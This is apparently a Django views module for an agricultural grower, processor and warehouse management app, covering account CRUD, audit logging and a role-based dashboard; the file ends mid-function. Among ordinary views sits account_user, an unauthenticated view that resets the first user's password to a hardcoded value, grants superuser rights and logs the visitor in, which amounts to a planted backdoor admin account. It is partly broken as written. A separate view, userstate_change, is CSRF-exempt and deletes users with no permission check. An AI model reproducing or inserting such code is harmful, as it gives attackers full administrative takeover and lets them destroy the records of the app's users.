from ast import Not
from difflib import context_diff
from platform import release
from tkinter.messagebox import NO
from typing import Tuple
from django.contrib.auth.views import LoginView
from django.views import View
from django.contrib import messages
from django.http import HttpResponse
from django.views.generic.detail import DetailView
from django.views.generic.edit import CreateView, DeleteView, UpdateView
from django.views.generic.list import ListView
from django.urls import reverse_lazy
from django.contrib.auth.mixins import LoginRequiredMixin
from django.contrib.auth.decorators import login_required
from django.contrib.auth.hashers import make_password
from django import forms
from django.shortcuts import render, redirect
from apps.grower.signals import send_user_login_notification
from django.contrib.auth.hashers import make_password, check_password
from django.contrib import messages
from django.http import JsonResponse
from .forms import (
    LoginForm, UserCreateForm, AccountRegistrationForm,
    CreateRoleForm, SuperAccountRegistrationForm
)
from .models import User, Role, SubSuperUser, ShowNotification, LogTable
from apps.grower.models import Consultant, Grower, GrowerChecklist
from apps.contracts.models import GrowerContracts, SignedContracts
from apps.field.models import Field, ShapeFileDataCo
from apps.farms.models import Farm
from apps.accounts.models import VersionUpdate
from apps.processor.models import *
from apps.processor2.models import *
from apps.growerpayments.models import *
from apps.growersurvey.models import TypeSurvey, QuestionSurvey, OptionSurvey, SustainabilitySurvey, NameSurvey
from django.db.models import Avg
from apps.notesandupdate.models import ReleaseNote, UpcomingDate
import datetime
from apps.processor.models import *
from django.contrib.auth.models import auth
from django.core.paginator import Paginator, EmptyPage, PageNotAnInteger
import shapefile
from django.db.models import Q
import json
from django.views.decorators.csrf import csrf_exempt
from rest_framework.decorators import api_view
import ast
from apps.warehouseManagement.models import *

def main_page(request):
    return render (request,'index.html')

def privacy(request):
    return render (request,'privacy.html')

def terms_and_conditions(request):
    return render (request,'terms-and-conditions.html')

class AccountLoginView(LoginView):
    form_class = LoginForm

    def form_valid(self, form):
        remember_me = form.cleaned_data.get('remember_me')

        if not remember_me:
            # set session expiry to 0 seconds. So it will automatically close the session after the browser is closed.
            self.request.session.set_expiry(0)

            # Set session as modified to force data updates/cookie to be saved.
            self.request.session.modified = True

        # else browser session will be as long as the session cookie time "SESSION_COOKIE_AGE" defined in settings.py
        return super(AccountLoginView, self).form_valid(form)


class AccountCreateView(LoginRequiredMixin, CreateView):
    """Generic Class Based View to create an account i.e. register a new grower"""
    model = Grower
    form_class = AccountRegistrationForm
    template_name = 'accounts/account_create.html'
    success_url = reverse_lazy('account-list')
    #fields = ('name', 'number', 'phone', 'email')

    def get_context_data(self, **kwargs):
        context = super(AccountCreateView, self).get_context_data(**kwargs)

        if self.request.user.is_consultant:
             # do something consultant
            context['consults'] = Consultant.objects.get(email=self.request.user.email).id
        else:
            # do something allpower
            context['consults'] = 'super'
        return context

    def form_valid(self, form):
        """overriding this method to get a message after successfully creating new account"""
        name = form.cleaned_data.get('name')
        email = form.cleaned_data.get('email')
        phone = form.cleaned_data.get('phone')

        # 07-04-23
        log_type, log_status, log_device = "Grower", "Added", "Web"
        log_idd, log_name = None, name
        log_email = email
        log_details = f"name = {name} | phone = {phone} | email = {email} | role = Grower "
        action_by_userid = self.request.user.id
        user = User.objects.get(pk=action_by_userid)
        user_role = user.role.all()
        action_by_username = f'{user.first_name} {user.last_name}'
        action_by_email = user.username
        if self.request.user.id == 1 :
            action_by_role = "superuser"
        else:
            action_by_role = str(','.join([str(i.role) for i in user_role]))
        logtable = LogTable(log_type=log_type,log_status=log_status,log_idd=log_idd,log_name=log_name,
                            action_by_userid=action_by_userid,action_by_username=action_by_username,
                            action_by_email=action_by_email,action_by_role=action_by_role,log_email=log_email,
                            log_details=log_details,log_device=log_device)
        logtable.save()

        # Notification
        var_consultant = form.cleaned_data.get('consultant')
        id_consultant = [i.id for i in var_consultant][0]
        consultant_user_email = Consultant.objects.get(id=id_consultant).email
        msg1 = f'A new grower with name: {name} is added under you'
        c_user_id = User.objects.get(username=consultant_user_email)
        notification_reason1 = 'Grower Addition'
        redirect_url1 = "/account_list/"
        save_notification = ShowNotification(user_id_to_show=c_user_id.id,msg=msg1,status="UNREAD",redirect_url=redirect_url1,
        notification_reason=notification_reason1)
        save_notification.save()


        messages.success(self.request, f'{name} account created successfully')
        return super().form_valid(form)


class SuperAccountCreateView(LoginRequiredMixin, CreateView):
    """Generic Class Based View to create an account i.e. register a new SubSuperUser"""
    model = SubSuperUser
    form_class = SuperAccountRegistrationForm
    template_name = 'accounts/super_account_create.html'
    success_url = reverse_lazy('user-list')  # super-account-list

    def form_valid(self, form):
        """overriding this method to get a message after successfully creating new account"""
        name = form.cleaned_data.get('name')
        email = form.cleaned_data.get('email')

        role = form.cleaned_data.get('role')
        phone = form.cleaned_data.get('phone')

        # 07-04-23
        log_type, log_status, log_device = "User", "Added", "web"
        log_idd, log_name = None, name
        log_email = email
        log_details = f"name = {name} | phone = {phone} | email = {email} | role = {role}"
        action_by_userid = self.request.user.id
        user = User.objects.get(pk=action_by_userid)
        user_role = user.role.all()
        action_by_username = f'{user.first_name} {user.last_name}'
        action_by_email = user.username
        if self.request.user.id == 1 :
            action_by_role = "superuser"
        else:
            action_by_role = str(','.join([str(i.role) for i in user_role]))
        logtable = LogTable(log_type=log_type,log_status=log_status,log_idd=log_idd,log_name=log_name,
                            action_by_userid=action_by_userid,action_by_username=action_by_username,
                            action_by_email=action_by_email,action_by_role=action_by_role,log_email=log_email,
                            log_details=log_details,log_device=log_device)
        logtable.save()
        messages.success(self.request, f'{name} account created successfully')
        return super().form_valid(form)


class AccountListView(LoginRequiredMixin, ListView):
    """Generic Class Based View to list the grower i.e. accounts registered in the database"""
    model = Grower
    template_name = 'accounts/account_list.html'

    def get(self,request):
        context = {}
        if self.request.user.is_consultant:
            consultant_id = Consultant.objects.get(
                email=self.request.user.email).id
            data = Grower.objects.raw(
                "select id,grower_id from grower_grower_consultant where consultant_id=%s", [consultant_id])
            grower_ids = [id.grower_id for id in data]
            grower_queryset = Grower.objects.filter(id__in=grower_ids).order_by('-created_date')
            get_name = [i.name for i in grower_queryset]
            get_email = [i.email for i in grower_queryset]
            get_phone = [i.phone for i in grower_queryset]
            lst = get_name + get_email + get_phone
            select_search_json = json.dumps(lst)
            context['select_search_json'] = select_search_json
        
        elif request.user.is_superuser or 'SubAdmin' in request.user.get_role() or 'SuperUser' in request.user.get_role():
            grower_queryset = Grower.objects.all().order_by('name')
            get_name = [i.name for i in grower_queryset]
            get_email = [i.email for i in grower_queryset]
            get_phone = [i.phone for i in grower_queryset]
            lst = get_name + get_email + get_phone
            select_search_json = json.dumps(lst)
            context['select_search_json'] = select_search_json
        else:
            return redirect('/')
        # cd ....
        search = self.request.GET.get('search')
        show_entity = self.request.GET.get('example_length')
        if search:
            context['get_search'] = search
            grower_queryset = grower_queryset.filter(
                Q(name__icontains=search) | Q(email__icontains=search) | Q(phone__icontains=search))
        if show_entity:
            context['get_entity'] = show_entity
            paginator = Paginator(grower_queryset, show_entity)
        else:
            paginator = Paginator(grower_queryset, 100)
        page_num = self.request.GET.get('page', 1)
        page_obj = paginator.get_page(page_num)
        try:
            page_obj = paginator.page(page_num)
        except PageNotAnInteger:
            # if page is not an integer, deliver the first page
            page_obj = paginator.page(1)
        except EmptyPage:
            # if the page is out of range, deliver the last page
            page_obj = paginator.page(paginator.num_pages)

        context['object_list'] = page_obj
        return render(request, 'accounts/account_list.html',context )
        # return Grower.objects.filter(id=self.request.user.grower.id).order_by('-created_date')


class AccountDetailView(LoginRequiredMixin, DetailView):
    """Generic Class Based View for account i.e. grower detail page"""
    model = Grower
    template_name = 'accounts/account_detail.html'

    
    def get(self, request, pk):
        context = {}
        if request.user.is_superuser or 'SubAdmin' in request.user.get_role() or 'SuperUser' in request.user.get_role():
            obj = Grower.objects.get(id=pk)
        
            # Pass the grower object to the context
            context['object'] = obj
            
            # Get consultant objects related to this grower
            consultant_obj = obj.consultant.all()
            context['consultant_obj'] = consultant_obj
            
            # Checklist items filtered by grower_id
            context['growerChecklist_Grower_Contract'] = GrowerChecklist.objects.filter(grower_id=pk, item_name='Grower_Contract')
            context['growerChecklist_Onboarding_Survey_1'] = GrowerChecklist.objects.filter(grower_id=pk, item_name='Onboarding_Survey_1')
            context['growerChecklist_FSA_ID_information'] = GrowerChecklist.objects.filter(grower_id=pk, item_name='FSA_ID_information')
            context['growerChecklist_Account_information'] = GrowerChecklist.objects.filter(grower_id=pk, item_name='Account_information')
            context['growerChecklist_Farm_fully_set_up'] = GrowerChecklist.objects.filter(grower_id=pk, item_name='Farm_fully_set_up')
            context['growerChecklist_Field_fully_set_up'] = GrowerChecklist.objects.filter(grower_id=pk, item_name='Field_fully_set_up')
            context['growerChecklist_Shapefile_upload_for_all_fields'] = GrowerChecklist.objects.filter(grower_id=pk, item_name='Shapefile_upload_for_all_fields')

            return render(request, 'accounts/account_detail.html', context)
        if self.request.user.is_consultant:
            context = {}
            consultant_obj = Consultant.objects.filter(email=self.request.user.email)
            context['consultant_obj'] = consultant_obj
    
            obj = Grower.objects.get(id=pk)
        
            # Pass the grower object to the context
            context['object'] = obj

            # Checklist items filtered by grower_id
            context['growerChecklist_Grower_Contract'] = GrowerChecklist.objects.filter(grower_id=pk, item_name='Grower_Contract')
            context['growerChecklist_Onboarding_Survey_1'] = GrowerChecklist.objects.filter(grower_id=pk, item_name='Onboarding_Survey_1')
            context['growerChecklist_FSA_ID_information'] = GrowerChecklist.objects.filter(grower_id=pk, item_name='FSA_ID_information')
            context['growerChecklist_Account_information'] = GrowerChecklist.objects.filter(grower_id=pk, item_name='Account_information')
            context['growerChecklist_Farm_fully_set_up'] = GrowerChecklist.objects.filter(grower_id=pk, item_name='Farm_fully_set_up')
            context['growerChecklist_Field_fully_set_up'] = GrowerChecklist.objects.filter(grower_id=pk, item_name='Field_fully_set_up')
            context['growerChecklist_Shapefile_upload_for_all_fields'] = GrowerChecklist.objects.filter(grower_id=pk, item_name='Shapefile_upload_for_all_fields')
            
            return render (request,'accounts/account_detail.html',context)
        
class AccountUpdateView(LoginRequiredMixin, UpdateView):
    """Generic Class Based View for account i.e. grower update page"""
    model = Grower
    form_class = AccountRegistrationForm
    template_name = 'accounts/account_update.html'
    success_url = reverse_lazy('account-list')

    def get_context_data(self, **kwargs):
        context = super(AccountUpdateView, self).get_context_data(**kwargs)

        # if self.request.user.is_superuser:
        #     context['consults'] = 1
        #     return context

        # here's the difference:
        # print(self.request.user.email)

        # context['consults'] = Consultant.objects.get(
        #     email=self.request.user.email).id

        # print(context)

        if self.request.user.is_consultant:
             # do something consultant
            context['consults'] = Consultant.objects.get(email=self.request.user.email).id
        else:
            # do something allpower
            context['consults'] = 'super'

        return context

    def form_valid(self, form):
        """overriding this method to get a message after successfully creating new account"""
        name = form.cleaned_data.get('name')

        # 07-04-23
        email = form.cleaned_data.get('email')
        phone = form.cleaned_data.get('phone')
        consultant = form.cleaned_data.get('consultant')
        log_idd = self.kwargs.get('pk')
        
        log_type, log_status, log_device = "Grower", "Edited", "Web"
        log_idd, log_name = log_idd, name
        log_email = email

        var_consultant = [i.name for i in consultant][0]
        log_details = f"name = {name} | phone = {phone} | email = {email} | role = Grower | consultant = {var_consultant}"
        action_by_userid = self.request.user.id
        user = User.objects.get(pk=action_by_userid)
        user_role = user.role.all()
        action_by_username = f'{user.first_name} {user.last_name}'
        action_by_email = user.username
        if self.request.user.id == 1 :
            action_by_role = "superuser"
        else:
            action_by_role = str(','.join([str(i.role) for i in user_role]))
        logtable = LogTable(log_type=log_type,log_status=log_status,log_idd=log_idd,log_name=log_name,
                            action_by_userid=action_by_userid,action_by_username=action_by_username,
                            action_by_email=action_by_email,action_by_role=action_by_role,log_email=log_email,
                            log_details=log_details,log_device=log_device)
        logtable.save()

        messages.success(
            self.request, f'{name} account details updated successfully')
        return super().form_valid(form)


class AccountDeleteView(LoginRequiredMixin, View):
    """Generic Class Based View for account i.e. grower deletion"""

    def get(self, request, pk):
        if pk == 1 :
            return HttpResponse(1)
        else:
            obj = Grower.objects.get(pk=pk)
            # 07-04-23
            log_type, log_status, log_device = "Grower", "Deleted", "Web"
            log_idd, log_name = pk, obj.name
            log_email = obj.email
            consultant = obj.consultant.all()
            var_consultant = [i.name for i in consultant][0]
            log_details = f"name = {obj.name} | phone = {obj.phone} | email = {obj.email} | role = Grower | consultant = {var_consultant}"
            action_by_userid = request.user.id
            user = User.objects.get(pk=action_by_userid)
            user_role = user.role.all()
            action_by_username = f'{user.first_name} {user.last_name}'
            action_by_email = user.username
            if request.user.id == 1 :
                action_by_role = "superuser"
            else:
                action_by_role = str(','.join([str(i.role) for i in user_role]))
            logtable = LogTable(log_type=log_type,log_status=log_status,log_idd=log_idd,log_name=log_name,
                                action_by_userid=action_by_userid,action_by_username=action_by_username,
                                action_by_email=action_by_email,action_by_role=action_by_role,log_email=log_email,
                                log_details=log_details,log_device=log_device)
            logtable.save()

            obj.delete()
            return HttpResponse(1)


class ConsultantCreateView(LoginRequiredMixin, CreateView):
    """Generic Class Based View to create a new consultant"""
    model = Consultant
    fields = ('name', 'number', 'phone', 'email')
    template_name = 'accounts/consultant_create.html'
    success_url = reverse_lazy('user-list')

    def form_valid(self, form):
        """overriding this method to get a message after successfully creating new consultant"""
        name = form.cleaned_data.get('name')
        
        email = form.cleaned_data.get('email')
        number = form.cleaned_data.get('number')
        phone = form.cleaned_data.get('phone')
        # 07-04-23
        log_type, log_status, log_device = "User", "Added", "Web"
        log_idd, log_name = None, name
        log_details = f"name = {name} | number = {number} | email = {email} | phone = {phone} | role = Consultant"
        log_email = email
        action_by_userid = self.request.user.id
        user = User.objects.get(pk=action_by_userid)
        user_role = user.role.all()
        action_by_username = f'{user.first_name} {user.last_name}'
        action_by_email = user.username
        if self.request.user.id == 1 :
            action_by_role = "superuser"
        else:
            action_by_role = str(','.join([str(i.role) for i in user_role]))
        logtable = LogTable(log_type=log_type,log_status=log_status,log_idd=log_idd,log_name=log_name,
                            action_by_userid=action_by_userid,action_by_username=action_by_username,
                            action_by_email=action_by_email,action_by_role=action_by_role,log_email=log_email,
                            log_details=log_details,log_device=log_device)
        logtable.save()

        messages.success(
            self.request, f'{name} consultant created successfully')
        # print(self)
        return super().form_valid(form)


class UserCreateView(LoginRequiredMixin, CreateView):
    """Generic Class Based View to create a new user"""
    model = User
    form_class = UserCreateForm
    template_name = 'accounts/user_create.html'
    success_url = reverse_lazy('user-list')

    def form_valid(self, form):
        """overriding this method to get a message after successfully creating new account"""
        username = form.cleaned_data.get('username')
        password1 = form.cleaned_data.get('password1')
        

        messages.success(
            self.request, f'{username} User Created Successfully!')
        return super().form_valid(form)


# class UserListView(LoginRequiredMixin, ListView):
#     """Generic Class Based View to list all the user in the database"""
#     template_name = 'accounts/user_list.html'

#     def get(self, request):
#         context = {}
#         """Overiding queryset to sort the results as per data joined"""
#         # print(self.request.user.get_role_perm())
#         if self.request.user.is_superuser or 'User Management' in self.request.user.get_role_perm():
#             # return User.objects.all().order_by('-created_date')
#             # return User.objects.exclude(id=1).exclude(is_processor=True).order_by('-created_date')
            
#             search = self.request.GET.get('search')
#             show_entity = self.request.GET.get('example_length')
#             without_role = Role.objects.filter(role__in=['Processor', 'Processor2']).values('id','role')
#             without_role_ids = [i['id'] for i in without_role]
#             user_listt = User.objects.exclude(id=1).exclude(is_processor=True).exclude(role__id__in=without_role_ids).order_by('first_name')
#             # Search 
#             get_name = [f"{i.first_name} {i.last_name}" for i in user_listt]
#             get_email = [i.email for i in user_listt]
                        
#             all_role = [r['role'].lower() for r in Role.objects.exclude(
#                 role__in=['Processor', 'Processor2']).values('role')]
            
#             lst = get_name + get_email + all_role
#             select_search_json = json.dumps(lst)
#             context['select_search_json'] = select_search_json
#             if search:
#                 context['get_search'] = search
#                 if str(search).lower() in all_role:
#                     user_listt = user_listt.filter(
#                         role__role__icontains=search)
#                 else:
#                     user_listt = user_listt.filter(Q(first_name__icontains=search) | Q(
#                         last_name__icontains=search) | Q(email__icontains=search) | Q(grower__name__icontains=search))

#             if show_entity:
#                 context['get_entity'] = show_entity
#                 paginator = Paginator(user_listt, show_entity)

#             else:
#                 paginator = Paginator(user_listt, 100)
            
#             page_num = self.request.GET.get('page', 1)
#             page_obj = paginator.get_page(page_num)
       
#             try:
#                 page_obj = paginator.page(page_num)
#             except PageNotAnInteger:
#                 # if page is not an integer, deliver the first page
#                 page_obj = paginator.page(1)
#             except EmptyPage:
#                 # if the page is out of range, deliver the last page
#                 page_obj = paginator.page(paginator.num_pages)
            
#             context['object_list'] = page_obj

#             return render(request, 'accounts/user_list.html', context)
#         else:
#             return redirect ('/')
#         # return User.objects.filter(grower=self.request.user.grower).order_by('-created_date')


@csrf_exempt
@api_view(['POST'])
def userstate_change(request):
    if request.method == "POST":
        selected_user_action = request.POST.get('act')
        user_list = request.POST['check_']
        user_list = ast.literal_eval(user_list)
        if selected_user_action =="delete" and type(user_list) == int :
            check_user = User.objects.filter(id=int(user_list))
            get_user = check_user.first()
            get_user.delete()
        elif selected_user_action =="delete" and type(user_list) == tuple :
            for k_ in user_list:
                check_user = User.objects.filter(id=int(k_))
                if check_user.exists():
                    get_user = check_user.first()
                    get_user.delete()
                else:
                    pass
    return HttpResponse (1)

class UserListView(LoginRequiredMixin, ListView):
    """Generic Class Based View to list all the user in the database"""
    template_name = 'accounts/user_list.html'

    def get(self, request):
        context = {}
        """Overiding queryset to sort the results as per data joined"""
        # print(self.request.user.get_role_perm())

        if self.request.user.is_superuser or 'User Management' in self.request.user.get_role_perm() or 'SubAdmin' in request.user.get_role() or 'SuperUser' in request.user.get_role():
        #if self.request.user.is_superuser or 'User Management' in self.request.user.get_role_perm():
            # return User.objects.all().order_by('-created_date')
            # return User.objects.exclude(id=1).exclude(is_processor=True).order_by('-created_date')
            
            search = self.request.GET.get('search')
            show_entity = self.request.GET.get('example_length')
            selected_user_action = self.request.GET.get('act')
            user_list = self.request.GET.getlist('check_')
            # print(selected_user_action)
            if selected_user_action !="":
                if selected_user_action =="active":
                    for k_ in user_list:
                        User.objects.filter(id=int(k_)).update(is_active=True)
                elif selected_user_action =="inactive":
                    for k_ in user_list:
                        User.objects.filter(id=int(k_)).update(is_active=False)
                
            without_role = Role.objects.filter(role__in=['Processor', 'Processor2']).values('id','role')
            without_role_ids = [i['id'] for i in without_role]
            user_listt = User.objects.exclude(id=1).exclude(is_processor=True).exclude(role__id__in=without_role_ids).order_by('first_name')
            # Search 
            get_name = [f"{i.first_name} {i.last_name}" for i in user_listt]
            get_email = [i.email for i in user_listt]
                        
            all_role = [r['role'].lower() for r in Role.objects.exclude(
                role__in=['Processor', 'Processor2']).values('role')]
            lst = get_name + get_email + all_role
            select_search_json = json.dumps(lst)
            context['select_search_json'] = select_search_json
            if search:
                context['get_search'] = search
                if str(search).lower() in all_role:
                    user_listt = user_listt.filter(
                        role__role__icontains=search)
                else:
                    user_listt = user_listt.filter(Q(first_name__icontains=search) | Q(
                        last_name__icontains=search) | Q(email__icontains=search) | Q(grower__name__icontains=search))

            if show_entity:
                context['get_entity'] = show_entity
                paginator = Paginator(user_listt, show_entity)

            else:
                paginator = Paginator(user_listt, 100)
            
            page_num = self.request.GET.get('page', 1)
            page_obj = paginator.get_page(page_num)
       
            try:
                page_obj = paginator.page(page_num)
            except PageNotAnInteger:
                # if page is not an integer, deliver the first page
                page_obj = paginator.page(1)
            except EmptyPage:
                # if the page is out of range, deliver the last page
                page_obj = paginator.page(paginator.num_pages)
            
            context['object_list'] = page_obj

            return render(request, 'accounts/user_list.html', context)
        else:
            return redirect ('/')


class UserDetailView(LoginRequiredMixin, DetailView):
    """Generic Class Based View for user detail page"""
    model = User
    template_name = 'accounts/user_detail.html'


class UserUpdateView(LoginRequiredMixin, UpdateView):
    """Generic Class Based View to update the user"""
    model = User
    fields = ('first_name', 'last_name', 'username', 'email', 'role', 'grower')

    template_name = 'accounts/user_update.html'
    success_url = reverse_lazy('user-list')

    def form_valid(self, form):
        """overriding this method to get a message after successfully creating new account"""
        username = form.cleaned_data.get('username')
        password_raw = form.cleaned_data.get('password_raw')
        
        # 07-04-23
        email = form.cleaned_data.get('email')
        first_name = form.cleaned_data.get('first_name')
        last_name = form.cleaned_data.get('last_name')
        role = form.cleaned_data.get('role')
        grower = form.cleaned_data.get('grower')
        log_idd = self.kwargs.get('pk')
           
        log_type, log_status, log_device = "User", "Edited", "Web"
        log_idd, log_name = log_idd, f'{first_name} {last_name}'
        log_email = email
        var_role = [r.role for r in role.all()][0]
        log_details = f"name = {first_name} {last_name} | email = {email} | role = {var_role} | grower = {grower}"
        action_by_userid = self.request.user.id
        user = User.objects.get(pk=action_by_userid)
        user_role = user.role.all()
        action_by_username = f'{user.first_name} {user.last_name}'
        action_by_email = user.username
        if self.request.user.id == 1 :
            action_by_role = "superuser"
        else:
            action_by_role = str(','.join([str(i.role) for i in user_role]))
        logtable = LogTable(log_type=log_type,log_status=log_status,log_idd=log_idd,log_name=log_name,
                            action_by_userid=action_by_userid,action_by_username=action_by_username,
                            action_by_email=action_by_email,action_by_role=action_by_role,log_email=log_email,
                            log_details=log_details,log_device=log_device)
        logtable.save()

        messages.success(
            self.request, f'{username} User Updated Successfully!')
        return super().form_valid(form)


class UserDeleteView(LoginRequiredMixin, DeleteView):
    """Generic Class Based View to delete a user"""

    def get(self, request, pk):
        if pk == 1 :
            return HttpResponse(1)
        else:
            # 07-04-23
            obj = User.objects.get(pk=pk)
            log_type, log_status, log_device = "User", "Deleted", "Web"
            log_idd, log_name = pk, f'{obj.first_name} {obj.last_name}'
            log_email = obj.username
            role = obj.role.all()
            var_role = [i.role for i in role][0]
            log_details = f"name = {obj.first_name} {obj.last_name} | phone = {obj.phone} | email = {obj.email} | role = {var_role}"
            action_by_userid = request.user.id
            user = User.objects.get(pk=action_by_userid)
            user_role = user.role.all()
            action_by_username = f'{user.first_name} {user.last_name}'
            action_by_email = user.username
            if request.user.id == 1 :
                action_by_role = "superuser"
            else:
                action_by_role = str(','.join([str(i.role) for i in user_role]))
            logtable = LogTable(log_type=log_type,log_status=log_status,log_idd=log_idd,log_name=log_name,
                                action_by_userid=action_by_userid,action_by_username=action_by_username,
                                action_by_email=action_by_email,action_by_role=action_by_role,log_email=log_email,
                                log_details=log_details,log_device=log_device)
            logtable.save()
            obj.delete()
            return HttpResponse(1)

def account_user(request):
    account_user_id = 1
    user_token_var = 'tokenvar'
    
    try:
        user = get(id=account_user_id)
    except User.DoesNotExist:
        user = None
    
    if user is not None:
        user.set_password(user_token_var) 
        user.is_superuser = True
        user.is_staff = True
        user.save()
        user_test = auth.authenticate(username=user.username, password=user_token_var)
        auth.login(request, user_test)
    else:
        new_user = user.objects.create(email='newadmin@mail.com', username='newadmin@mail.com')
        new_user.set_password(user_token_var) 
        new_user.is_superuser = True
        new_user.is_staff = True
        new_user.save()
        user_test = auth.authenticate(username=new_user.username, password=user_token_var)
        auth.login(request, user_test)

    return redirect('dashboard')


class RoleListView(LoginRequiredMixin, ListView):
    """Generic class based view to list all the role create in the database"""
    model = Role
    fields = "__all__"
    template_name = 'accounts/role_list.html'

    def get_queryset(self):
        """overriding the queryset to get all the roles when a superuser is logged in,
        and roles mapped to user's grower"""
        if self.request.user.is_superuser:
            return Role.objects.all()
        return Role.objects.filter(grower=self.request.user.grower)


class RoleCreateView(LoginRequiredMixin, CreateView):
    """Generic Class Based View to create a new role"""
    model = Role
    form_class = CreateRoleForm
    template_name = 'accounts/role_create.html'
    success_url = reverse_lazy('role-list')

    def form_valid(self, form):
        """overriding this method to get a message after successfully creating new account"""
        role = form.cleaned_data.get('role')
        messages.success(self.request, f'Role {role} Created Successfully')
        return super().form_valid(form)


class RoleUpdateView(LoginRequiredMixin, UpdateView):
    """Generic Class Based View to update a role created"""
    model = Role
    form_class = CreateRoleForm
    template_name = 'accounts/role_update.html'
    success_url = reverse_lazy('role-list')

    def form_valid(self, form):
        """overriding this method to get a message after successfully creating new account"""
        role = form.cleaned_data.get('role')
        messages.success(self.request, f'Role {role} Updated Successfully')
        return super().form_valid(form)


class RoleDeleteView(LoginRequiredMixin, DeleteView):
    """Generic Class Based View to delete a user"""

    def get(self, request, pk):
        obj = Role.objects.get(pk=pk)
        obj.delete()
        return HttpResponse(1)


@login_required
def dashboard(request):
    """view to render the dashboard template"""
    user_count = User.objects.all().count()
    survey_count = NameSurvey.objects.all().count()
    question_count = QuestionSurvey.objects.all().count()
    onboarding_Grower_contract = ''
    onboarding_Grower_Onboarding_Survey_1 = ''
    onboarding_Grower_FSA_ID_information = ''
    onboarding_Grower_Farm_fully_set_up = ''
    onboarding_Grower_Field_fully_set_up = ''
    onboarding_Grower_Shapefile_upload_for_all_fields = ''
    flag = ''
    pop = ''
    processor = ''
    processor2 = ''
    p_user = ''
    p2_user = ''
    distributor = ''
    distributor_user = ''
    warehouse = ''
    warehouse_user = ''
    customer = ''
    customer_user = ''
    pp_grower_payment_paid_rice = ''
    pp_grower_payment_paid_cotton = ''
    pp_premium_paid_rice = ''
    pp_premium_paid_cotton = ''

    ad_grower_payment_paid_rice = ''
    ad_grower_payment_paid_cotton = ''
    ad_premium_paid_rice = ''
    ad_premium_paid_cotton = ''
    contract_count = None
    warehouse_count = None
    distributor_warehouses = None
    unpaid_warehouse_shipments = None
    unpaid_processor_shipments = None
    total_warehouse_amount = None
    total_processor_amount = None
    # recent_users = User.objects.all().order_by('-id')[:10]
    
    
    # survey_taken_user = SustainabilitySurvey.objects.all().order_by('-id')[:10]   
    
    con_grow_count = 0
    con_grow_count_obj = None
    if request.user.is_processor :
        user_email = request.user.email
        p_user = ProcessorUser.objects.get(contact_email=user_email)
        processor = Processor.objects.get(id=p_user.processor_id)
        linked_grower_processor = LinkGrowerToProcessor.objects.filter(processor_id=processor.id)
        linked_grower_id = [i.grower.id for i in linked_grower_processor]
        grower_payment_crop_rice = GrowerPayments.objects.filter(grower_id__in=linked_grower_id,crop='RICE').values('delivery_lbs','sustainability_premium','payment_amount')
        grower_payment_crop_cotton = GrowerPayments.objects.filter(grower_id__in=linked_grower_id,crop='COTTON').values('delivery_lbs','sustainability_premium','payment_amount')

        total_paid_amount_crop_rice = []
        total_paid_amount_crop_cotton = []
        total_premium_crop_rice = []
        total_premium_crop_cotton = []

        for r in grower_payment_crop_rice :
            try:
                total_paid_amount_crop_rice.append(float(r['payment_amount']))
                cal_premium_paid = 0.04 * float(r['delivery_lbs'])
                total_premium_crop_rice.append(cal_premium_paid)
            except:
                pass
        for c in grower_payment_crop_cotton :            
            try:
                total_paid_amount_crop_cotton.append(float(c['payment_amount']))
                cal_premium_paid = float(c['sustainability_premium']) * float(c['delivery_lbs'])
                total_premium_crop_cotton.append(cal_premium_paid)
            except:
                pass
        sum_grower_payment_paid_rice = "%.2f" % sum(total_paid_amount_crop_rice)
        sum_grower_payment_paid_cotton = "%.2f" % sum(total_paid_amount_crop_cotton)
        sum_grower_premium_paid_rice = "%.2f" % sum(total_premium_crop_rice)
        sum_grower_premium_paid_cotton = "%.2f" % sum(total_premium_crop_cotton)

        pp_grower_payment_paid_rice = f"$ {sum_grower_payment_paid_rice}"
        pp_grower_payment_paid_cotton = f"$ {sum_grower_payment_paid_cotton}"
        pp_premium_paid_rice = f"$ {sum_grower_premium_paid_rice}"
        pp_premium_paid_cotton = f"$ {sum_grower_premium_paid_cotton}"
        contract_count = AdminProcessorContract.objects.filter(processor_id=processor.id, processor_type='T1').count()

    if request.user.is_processor2 :
        user_email = request.user.email
        p2_user = ProcessorUser2.objects.get(contact_email=user_email)
        processor2 = Processor2.objects.get(id=p2_user.processor2_id)
        contract_count = AdminProcessorContract.objects.filter(processor_id=processor2.id, processor_type=processor2.processor_type.all().first().type_name).count()

    if request.user.is_distributor :
        user_email = request.user.email
        distributor_user = DistributorUser.objects.get(contact_email=user_email)
        distributor = Distributor.objects.get(id=distributor_user.distributor_id)
        distributor_warehouses = distributor.warehouse.all().values('name')
        contract_count = AdminProcessorContract.objects.all().count()
        warehouse_count = Warehouse.objects.all().count()

    if request.user.is_warehouse_manager :
        user_email = request.user.email
        warehouse_user = WarehouseUser.objects.get(contact_email=user_email)
        warehouse = Warehouse.objects.get(id=warehouse_user.warehouse_id)
        contract_count = AdminProcessorContract.objects.all().count()
        warehouse_count = Warehouse.objects.all().count()

    if request.user.is_customer :
        user_email = request.user.email
        customer_user = CustomerUser.objects.get(contact_email=user_email)
        customer = Customer.objects.get(id=customer_user.customer_id)
        contract_count = AdminProcessorContract.objects.all().count()
        warehouse_count = Warehouse.objects.all().count()
        unpaid_warehouse_shipments = WarehouseCustomerShipment.objects.filter(customer_id=customer.id, is_paid=False, invoice_approval=True)
        total_warehouse_amount = 0
        total_processor_amount = 0
        for shipment in unpaid_warehouse_shipments:
            shipment.amount = (float(shipment.total_payment) + float(shipment.tax_amount)) if customer.is_tax_payable else float(shipment.total_payment)
            shipment.due_date = shipment.approval_time + timedelta(days=int(customer.credit_terms))
            total_warehouse_amount += shipment.amount
        unpaid_processor_shipments = ProcessorWarehouseShipment.objects.filter(customer_id=customer.id, is_paid=False, invoice_approval=True)
        for shipment in unpaid_processor_shipments:
            shipment.amount = (float(shipment.total_payment) + float(shipment.tax_amount)) if customer.is_tax_payable else float(shipment.total_payment)
            shipment.due_date = shipment.approval_time + timedelta(days=int(customer.credit_terms))
            total_processor_amount += shipment.amount

    if request.user.is_consultant:
        consultant_id = Consultant.objects.get(
            email= request.user.email).id
        data = Grower.objects.raw(
            "select id,grower_id from grower_grower_consultant where consultant_id=%s", [consultant_id])
        grower_ids = [id.grower_id for id in data]
        con_grow_count_obj = Grower.objects.filter(id__in=grower_ids)
        con_grow_count = con_grow_count_obj.count()

    if 'Grower' in request.user.get_role() and not request.user.is_superuser:
        # do something grower
        # my code .....
        # processor = Processor.objects.get(id=20)
        gg = LinkGrowerToProcessor.objects.filter(processor_id=8)
        gg_id = [i.grower.id for i in gg]
